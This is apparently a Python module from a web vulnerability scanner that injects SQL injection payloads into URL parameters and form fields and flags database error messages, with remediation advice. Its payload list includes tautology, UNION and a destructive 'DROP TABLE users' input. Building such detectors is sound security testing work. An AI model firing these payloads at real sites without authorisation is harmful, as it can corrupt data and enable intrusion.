import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import re


# SQL Injection test payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1' ORDER BY 1--",
    "1 UNION SELECT NULL--",
    "' UNION SELECT NULL--",
    "1; DROP TABLE users--",
    "' AND 1=1--",
    "' AND 1=2--",
    "admin'--",
    "1' OR '1'='1' #",
    "' OR 1=1 LIMIT 1--",
]

# Error signatures that indicate SQL injection vulnerability
SQL_ERROR_SIGNATURES = [
    # MySQL
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql_query",
    # PostgreSQL
    "pg_query",
    "pg_exec",
    "postgresql",
    "unterminated quoted string",
    # SQLite
    "sqlite3.operationalerror",
    "sqlite_error",
    "unrecognized token",
    # MSSQL
    "microsoft ole db provider for sql server",
    "unclosed quotation mark after the character string",
    "mssql_query",
    "odbc sql server driver",
    # Oracle
    "ora-01756",
    "ora-00933",
    "oracle error",
    "quoted string not properly terminated",
    # Generic
    "sql syntax",
    "sql error",
    "syntax error",
    "database error",
    "query failed",
    "sql command not properly ended",
    "invalid query",
]


class SQLiScanner:
    """Test for SQL Injection vulnerabilities."""

    def __init__(self, session=None, timeout=10):
        self.session = session or requests.Session()
        self.timeout = timeout
        self.vulnerabilities = []

    def scan_url_params(self, url):
        """Test URL parameters for SQL injection."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            return

        for param_name in params:
            for payload in SQLI_PAYLOADS:
                try:
                    # Build modified URL
                    modified_params = dict(params)
                    modified_params[param_name] = [payload]
                    new_query = urlencode(modified_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))

                    response = self.session.get(test_url, timeout=self.timeout, verify=False)
                    body = response.text.lower()

                    # Check for SQL error signatures
                    for sig in SQL_ERROR_SIGNATURES:
                        if sig in body:
                            self.vulnerabilities.append({
                                'vuln_type': 'SQL Injection',
                                'risk_level': 'High',
                                'url': url,
                                'description': (
                                    f'Potential SQL Injection found in URL parameter "{param_name}". '
                                    f'The application returned a database error when injected with '
                                    f'a SQL payload, indicating that user input may be directly '
                                    f'concatenated into SQL queries without proper sanitization.'
                                ),
                                'evidence': f'Parameter: {param_name} | Payload: {payload} | Error matched: "{sig}"',
                                'solution': (
                                    'Use parameterized queries (prepared statements) instead of '
                                    'string concatenation. Apply input validation and use an ORM.'
                                )
                            })
                            return  # One finding per param is enough

                except requests.exceptions.RequestException:
                    continue

    def scan_form(self, form):
        """Test form inputs for SQL injection."""
        action_url = form['action']
        method = form['method']
        inputs = form['inputs']

        for input_field in inputs:
            for payload in SQLI_PAYLOADS[:6]:  # Use fewer payloads for forms
                try:
                    # Build form data with payload
                    data = {}
                    for inp in inputs:
                        if inp['name'] == input_field['name']:
                            data[inp['name']] = payload
                        else:
                            data[inp['name']] = inp.get('value', 'test')

                    if method == 'post':
                        response = self.session.post(action_url, data=data,
                                                     timeout=self.timeout, verify=False)
                    else:
                        response = self.session.get(action_url, params=data,
                                                    timeout=self.timeout, verify=False)

                    body = response.text.lower()

                    for sig in SQL_ERROR_SIGNATURES:
                        if sig in body:
                            self.vulnerabilities.append({
                                'vuln_type': 'SQL Injection',
                                'risk_level': 'High',
                                'url': action_url,
                                'description': (
                                    f'Potential SQL Injection found in form field "{input_field["name"]}" '
                                    f'at {action_url}. The submitted form triggered a database error, '
                                    f'suggesting user input is used in SQL queries without sanitization.'
                                ),
                                'evidence': (
                                    f'Form action: {action_url} | Method: {method.upper()} | '
                                    f'Field: {input_field["name"]} | Payload: {payload} | '
                                    f'Error matched: "{sig}"'
                                ),
                                'solution': (
                                    'Use parameterized queries (prepared statements). '
                                    'Sanitize and validate all form inputs on the server side.'
                                )
                            })
                            return  # One finding per form is enough

                except requests.exceptions.RequestException:
                    continue

    def get_results(self):
        """Return deduplicated results."""
        seen = set()
        unique = []
        for v in self.vulnerabilities:
            key = (v['vuln_type'], v['url'], v.get('evidence', '')[:60])
            if key not in seen:
                seen.add(key)
                unique.append(v)
        return unique
